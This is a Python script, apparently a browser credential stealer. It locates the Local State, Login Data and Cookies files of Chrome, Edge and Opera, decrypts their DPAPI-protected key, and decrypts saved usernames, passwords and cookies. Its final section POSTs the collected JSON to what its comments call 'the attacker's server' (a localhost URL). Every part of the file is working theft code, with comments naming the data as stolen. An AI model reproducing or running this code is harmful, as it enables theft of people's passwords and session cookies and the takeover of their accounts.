import shutil
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES
import os
import json
import requests

encKeyPaths = [
    r"%s\AppData\Local\Google\Chrome\User Data\Local State", 
    r"%s\AppData\Local\Microsoft\Edge\User Data\Local State", 
    r"%s\AppData\Roaming\Opera Software\Opera Stable\Local State"
]
loginDataPaths = [
    r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data", 
    r"%s\AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
    r"%s\AppData\Roaming\Opera Software\Opera Stable\Login Data"
]
cookieDataPaths = [
    r"%s\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",
    r"%s\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies",
    r"%s\AppData\Roaming\Opera Software\Opera Stable\Network\Cookies"
]

# method that gets the encryption key from windows
def getEncryptionKey(encKeyPath):
    f = open(os.path.normpath(encKeyPath%(os.environ['USERPROFILE'])))
    opened = f.read()
    db = json.loads(opened)
    secret = db["os_crypt"]["encrypted_key"]

    # thus we must decode the encryption key
    enc_key = base64.b64decode(secret)
    # the return is something which has been encoded using windows data protection api (seen from the dpapi line)
    # we remove the dpapi line
    enc_key = enc_key[5:] 
    # result is still need to be decrypted via the dpapi
    #the dpapi key is machine specific
    enc_key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    
    return enc_key

# method that gets the encrypted login data and decrypts it
def getAndDecryptLoginData(loginDataPath):
    #Chrome username & password file path
    path_login_db = os.path.normpath(loginDataPath%(os.environ['USERPROFILE']))
    ###### sometimes db can appear as locked, bellow is fix ############
    shutil.copy(path_login_db,'tempdata.db')
    #Connect to sqlite database
    conn = sqlite3.connect('tempdata.db')
    cursor = conn.cursor()
    #Select statement to retrieve info

    return cursor, conn

# method used to build the json file with the stolen data
def buildJson(encKeyPath, loginDataPath):
    enc_key = getEncryptionKey(encKeyPath)
    cursor, conn = getAndDecryptLoginData(loginDataPath)

    curr = '{}'
    data = json.loads(curr)

    saveduser = ''
    savedpass = ''
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for index,login in enumerate(cursor.fetchall()):
        url = login[0]
        passw = login[2]
        initialisation_vector = passw[3:15]
        encrypted_password = passw[15:-16]
        cipher = AES.new(enc_key, AES.MODE_GCM, initialisation_vector)
        data[url] = {
            'user': login[1],
            'pass': cipher.decrypt(encrypted_password).decode()
        }
       
    # close connection to db and remove the db made
    conn.close()
    os.remove('tempdata.db')
    return data

# method used to build the json file with the stolen cookie data
def buildCookieJson(encKeyPath, cookieDataPath):
    path_cookie_db = os.path.normpath(cookieDataPath%(os.environ['USERPROFILE']))
    enc_key = getEncryptionKey(encKeyPath)
    shutil.copy(path_cookie_db, 'tempdata.db')
    conn = sqlite3.connect('tempdata.db')
    #needed this to read without decoding to avoid errors
    conn.text_factory = bytes
    cursor = conn.cursor()

    curr = '{}'
    data = json.loads(curr)

    saveduser = ''
    savedpass = ''
    cursor.execute("SELECT name, encrypted_value, expires_utc  FROM cookies")
    for index, name in enumerate(cursor.fetchall()):
        cookie = name[1]
        initialisation_vector = cookie[3:15]
        encrypted_password = cookie[15:-16]
        cipher = AES.new(enc_key, AES.MODE_GCM, initialisation_vector)
        cookie = cipher.decrypt(encrypted_password)
        data[name[0].decode()] = {
            'value': str(cookie),
            'expires_utc': name[2]
        }
       
    # close connection to db and remove the db made
    conn.close()
    os.remove('tempdata.db')
    return data

#get the json file
passFile = None
cookieFile = None
files = []

for i in range(len(loginDataPaths)):
    if i == 0:
        try:
            files.append(buildJson(encKeyPath=encKeyPaths[i], loginDataPath=loginDataPaths[i]))
            files.append(buildCookieJson(encKeyPath=encKeyPaths[i], cookieDataPath=cookieDataPaths[i]))
        except:
            print("No Chrome installed!")
    if i == 1:
        try:
            files.append(buildJson(encKeyPath=encKeyPaths[i], loginDataPath=loginDataPaths[i]))
            files.append(buildCookieJson(encKeyPath=encKeyPaths[i], cookieDataPath=cookieDataPaths[i]))
        except:
            print("No Edge installed!")
    if i == 2:
        try:
            files.append(buildJson(encKeyPath=encKeyPaths[i], loginDataPath=loginDataPaths[i]))
            files.append(buildCookieJson(encKeyPath=encKeyPaths[i], cookieDataPath=cookieDataPaths[i]))
        except:
            print("No Opera installed!")
   

# send the data to the attacker's server
url = 'http://localhost:5000/send/json'
headers = {'Content-Type': 'application/json'}  # Set the Content-Type header
for i in range(len(loginDataPaths)*2):
    response = requests.post(url, json=files[i], headers=headers)
    print(response.text)